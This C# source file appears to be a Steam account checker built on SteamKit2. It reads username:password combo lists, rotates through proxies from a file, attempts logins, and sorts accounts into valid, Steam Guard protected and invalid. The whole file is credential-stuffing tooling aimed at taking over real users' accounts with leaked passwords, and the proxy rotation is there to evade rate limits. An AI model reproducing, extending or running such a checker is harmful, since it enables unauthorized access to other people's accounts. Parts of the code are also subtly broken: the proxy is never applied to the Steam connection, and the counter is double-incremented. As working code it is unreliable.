using SteamKit2;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using System.Net.Http;
using System.Threading.Tasks;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.StartPanel;
using System.IO;
using System.Net;

namespace Steam_Checker
{
    public class Checker
    {
        private static int Index = 0;
        private List<string> proxyList;

        public delegate void AccountCheckedEventHandler(int Index, int Count, Account Account);

        public event AccountCheckedEventHandler OnAccountChecked;

        public delegate void CheckerDoneEventHandler(TimeSpan time);

        public event CheckerDoneEventHandler OnCheckerDone;

        private void AccountChecked(int Index, int Count, Account Account)
        {
            if (OnAccountChecked != null)
                OnAccountChecked(Index, Count, Account);
        }

        private void CheckerDone(TimeSpan time)
        {
            if (OnCheckerDone != null)
                OnCheckerDone(time);
        }

        public Checker()
        {
            // Load proxy list from "proxies.txt" file
            proxyList = File.ReadAllLines("proxies.txt").ToList();
        }

        public void CheckAccounts(ref List<string> combos)
        {
            DateTime nowTime = DateTime.Now;
            Index = 0;
            List<string> Usernames = new List<string>();
            List<string> Passwords = new List<string>();

            combos = combos.Distinct().ToList();
            combos.RemoveAll(i => String.IsNullOrEmpty(i) || String.IsNullOrWhiteSpace(i) || !i.Contains(":"));
            combos.ForEach(i => { Usernames.Add(i.Split(':')[0]); Passwords.Add(i.Split(':')[1]); });

            int count = combos.Count;
            for (int i = 0; i < combos.Count; ++i)
            {
                var account = CheckAccount(Usernames[i], Passwords[i]);

                Index++;
                Thread thread = new Thread(() =>
                {
                    AccountChecked(Index, count, account);
                });
                thread.Start();

                if (i == combos.Count - 1)
                {
                    Thread thread2 = new Thread(() =>
                    {
                        CheckerDone(nowTime.Subtract(DateTime.Now));
                    });
                    thread2.Start();
                }
            }
        }

        private Account CheckAccount(string Username, string Password)
        {
            string selectedProxy = GetNextProxy(); // Get a proxy from the list

            SteamChecker steamChecker = new SteamChecker(Username, Password, selectedProxy); // Provide the selected proxy
            Account account = steamChecker.Account;

            // ... (rest of your code)

            return account;
        }


        private string GetNextProxy()
        {
            // Get the next proxy from the list, and wrap around if necessary
            string proxy = proxyList[Index % proxyList.Count];
            Index++;
            return proxy;
        }
    }

    public class Accounts
    {
        public List<Account> Vaild = new List<Account>();
        public List<Account> SteamGuardProtected = new List<Account>();
        public List<Account> InVaild = new List<Account>();

        public Accounts()
        {
        }
    }

    public enum Status
    {
        Success,
        SteamGuardProtected,
        Fail
    }

    public class Account
    {
        public string Username;
        public string Password;
        public ulong Id;
        public Status Type;

        public Account(string Username, string Password, ulong Id, Status Type)
        {
            this.Username = Username;
            this.Password = Password;
            this.Id = Id;
            this.Type = Type;
        }
    }

    public class SteamChecker
    {
        private SteamClient steamClient;
        private SteamUser steamUser;
        private CallbackManager manager;
        private bool isRunning;
        private string Username;
        private string Password;
        private string SelectedProxy; 
        public Account Account;

        public SteamChecker(string Username, string Password, string selectedProxy)
        {
            this.Username = Username;
            this.Password = Password;
            this.SelectedProxy = selectedProxy; // Store the selected proxy

            // Initialize other fields and subscribe to callbacks
            this.steamClient = new SteamClient();
            this.manager = new CallbackManager(this.steamClient);
            this.steamUser = this.steamClient.GetHandler<SteamUser>();
            this.manager.Subscribe<SteamClient.ConnectedCallback>(OnConnected);
            this.manager.Subscribe<SteamClient.DisconnectedCallback>(OnDisconnected);
            this.manager.Subscribe<SteamUser.LoggedOnCallback>(OnLoggedOn);
            this.manager.Subscribe<SteamUser.LoggedOffCallback>(OnLoggedOff);
            this.isRunning = true;
            this.steamClient.Connect(null);

            while (this.isRunning)
                this.manager.RunWaitCallbacks(TimeSpan.FromSeconds(1.0));
        }

        //private void OnConnected(SteamClient.ConnectedCallback callback)
        //{
        //    if (callback != null)
        //    {
        //        // Use the selected proxy for the HTTP requests
        //        var proxy = new WebProxy(SelectedProxy);
        //        HttpClientHandler handler = new HttpClientHandler
        //        {
        //            Proxy = proxy,
        //            UseProxy = true
        //        };

        //        HttpClient httpClient = new HttpClient(handler);

        //        this.steamUser.LogOn(new SteamUser.LogOnDetails
        //        {
        //            Username = this.Username,
        //            Password = this.Password
        //        });
        //    }
        //    else
        //    {
        //        MessageBox.Show("Callback is null", "Internal Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        //    }
        //}

        private void OnConnected(SteamClient.ConnectedCallback callback)
        {
            if (callback != null)
            {
                try
                {
                    var proxy = new WebProxy(SelectedProxy);

                    using (HttpClientHandler handler = new HttpClientHandler
                    {
                        Proxy = proxy,
                        UseProxy = true
                    })
                    {
                        using (HttpClient httpClient = new HttpClient(handler))
                        {
                            this.steamUser.LogOn(new SteamUser.LogOnDetails
                            {
                                Username = this.Username,
                                Password = this.Password
                            });
                        }
                    }
                }
                catch (Exception ex)
                {
                    // Handle the exception, which indicates an invalid proxy
                    Console.WriteLine($"Invalid proxy '{SelectedProxy}': {ex.Message}");
                    Account = new Account(Username, Password, 0, Status.Fail);
                    steamUser.LogOff();
                }
            }
            else
            {
                MessageBox.Show("Callback is null", "Internal Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
            }
        }


        private void OnDisconnected(SteamClient.DisconnectedCallback callback)
        {
            if (callback != null)
                isRunning = false;
            else
                MessageBox.Show("Callback is null", "Internal Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }

        //private void OnLoggedOn(SteamUser.LoggedOnCallback callback)
        //{
        //    if (callback.Result != EResult.OK)
        //    {
        //        if (callback.Result == EResult.AccountLogonDenied)
        //        {
        //            this.Account = new Account(this.Username, this.Password, steamUser.SteamID, Status.SteamGuardProtected);
        //            steamUser.LogOff();
        //        }
        //        else
        //        {
        //            this.Account = new Account(this.Username, this.Password, 0, Status.Fail);
        //            steamUser.LogOff();
        //        }
        //    }
        //    else
        //    {
        //        this.Account = new Account(this.Username, this.Password, steamUser.SteamID, Status.Success);
        //        steamUser.LogOff();
        //    }
        //}

        private void OnLoggedOn(SteamUser.LoggedOnCallback callback)
        {
            if (callback.Result != EResult.OK)
            {
                if (callback.Result == EResult.AccountLogonDenied)
                {
                    Account = new Account(Username, Password, 0, Status.SteamGuardProtected); // SteamID set to 0
                    steamUser.LogOff();
                }
                else
                {
                    Account = new Account(Username, Password, 0, Status.Fail); // SteamID set to 0
                    steamUser.LogOff();
                }
            }
            else
            {
                Account = new Account(Username, Password, steamUser.SteamID, Status.Success); // Set SteamID here
                steamUser.LogOff();
            }
        }


        private void OnLoggedOff(SteamUser.LoggedOffCallback callback) => Console.WriteLine(string.Format("➜ Closing: {0}", callback.Result));
    }
}